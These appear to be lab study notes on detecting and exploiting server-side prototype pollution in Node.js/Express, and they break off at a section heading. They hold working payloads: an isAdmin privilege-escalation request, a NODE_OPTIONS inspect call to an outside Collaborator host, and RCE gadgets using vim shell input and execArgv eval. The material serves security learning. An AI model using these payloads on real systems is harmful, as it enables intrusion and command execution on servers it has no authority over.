# Breif
## Detection
- **Status code override**. In lab we where modifing 500 **Internal server error** to be other thing using 
```js
"__proto__": {
    "status":555
}
```
- **JSON spaces override**, batched in versions of node.
- **Charset override**
- Bypassing input filters for server-side prototype pollution
	- Obfuscate the prohibited keywords so they're missed during the sanitization. For more information, see [Bypassing flawed key sanitization](https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization).
	- Access the prototype via the constructor property instead of `__proto__`. For more information, see [Prototype pollution via the constructor](https://portswigger.net/web-security/prototype-pollution/client-side#prototype-pollution-via-the-constructor)
```json
"constructor": {
    "prototype": {
        "json spaces":10
    }
}
```
- Use burp extension **Server-Side Prototype Pollution Scanner**.
## Exploitation
- privilege escalation.
- burp collaborater interaction.
```js
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```
- RCE
```js
"__proto__": {
	"shell":"vim",
	"input":":! <command>\n"
}
// or
"execArgv": [
    "--eval=require('<module>'); console.log('hello world')"
]
```

---
# Detail
## Detection
### Status code override

Server-side JavaScript frameworks like Express allow developers to set custom HTTP response statuses. In the case of errors, a JavaScript server may issue a generic HTTP response, but include an error object in JSON format in the body. This is one way of providing additional details about why an error occurred, which may not be obvious from the default HTTP status.

Although it's somewhat misleading, it's even fairly common to receive a `200 OK` response, only for the response body to contain an error object with a different status.

```http
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Node's `http-errors` module contains the following function for generating this kind of error response:

```json
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

The first highlighted line attempts to assign the `status` variable by reading the `status` or `statusCode` property from the object passed into the function. If the website's developers haven't explicitly set a `status` property for the error, you can potentially use this to probe for prototype pollution as follows:

1. Find a way to trigger an error response and take note of the default status code.
2. Try polluting the prototype with your own `status` property. Be sure to use an obscure status code that is unlikely to be issued for any other reason.
3. Trigger the error response again and check whether you've successfully overridden the status code.

> [!NOTE]
> You must choose a status code in the `400`-`599` range. Otherwise, Node defaults to a `500` status regardless, as you can see from the second highlighted line, so you won't know whether you've polluted the prototype or not.

---
### JSON spaces override

The Express framework provides a `json spaces` option, which enables you to configure the number of spaces used to indent any JSON data in the response. In many cases, developers leave this property undefined as they're happy with the default value, making it susceptible to pollution via the prototype chain.

If you've got access to any kind of JSON response, you can try polluting the prototype with your own `json spaces` property, then reissue the relevant request to see if the indentation in the JSON increases accordingly. You can perform the same steps to remove the indentation in order to confirm the vulnerability.

This is an especially useful technique because it doesn't rely on a specific property being reflected. It's also extremely safe as you're effectively able to turn the pollution on and off simply by resetting the property to the same value as the default.

Although the prototype pollution has been fixed in Express 4.17.4, websites that haven't upgraded may still be vulnerable.

> [!NOTE]
> When attempting this technique in Burp, remember to switch to the message editor's **Raw** tab. Otherwise, you won't be able to see the indentation change as the default prettified view normalizes this.

---
### Charset override

Express servers often implement so-called "middleware" modules that enable preprocessing of requests before they're passed to the appropriate handler function. For example, the `body-parser` module is commonly used to parse the body of incoming requests in order to generate a `req.body` object. This contains another gadget that you can use to probe for server-side prototype pollution.

Notice that the following code passes an options object into the `read()` function, which is used to read in the request body for parsing. One of these options, `encoding`, determines which character encoding to use. This is either derived from the request itself via the `getCharset(req)` function call, or it defaults to UTF-8.
```js
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

If you look closely at the `getCharset()` function, it looks like the developers have anticipated that the `Content-Type` header may not contain an explicit `charset` attribute, so they've implemented some logic that reverts to an empty string in this case. Crucially, this means it may be controllable via prototype pollution.

If you can find an object whose properties are visible in a response, you can use this to probe for sources. In the following example, we'll use UTF-7 encoding and a JSON source.

1. Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, `foo` in UTF-7 is `+AGYAbwBv-`.
```json
 {
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```
2. Send the request. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form.
3. Try to pollute the prototype with a `content-type` property that explicitly specifies the UTF-7 character set:
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```
4. Repeat the first request. If you successfully polluted the prototype, the UTF-7 string should now be decoded in the response:
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

Due to a bug in Node's `_http_incoming` module, this works even when the request's actual `Content-Type` header includes its own `charset` attribute. To avoid overwriting properties when a request contains duplicate headers, the `_addHeaderLine()` function checks that no property already exists with the same key before transferring properties to an `IncomingMessage` object
```js
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```

If it does, the header being processed is effectively dropped. Due to the way this is implemented, this check (presumably unintentionally) includes properties inherited via the prototype chain. This means that if we pollute the prototype with our own `content-type` property, the property representing the real `Content-Type` header from the request is dropped at this point, along with the intended value derived from the header.

---
## Exploitation
### Privilege Escalation
```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "isAdmin":true
    }
}
```

### Burp collaborater interaction
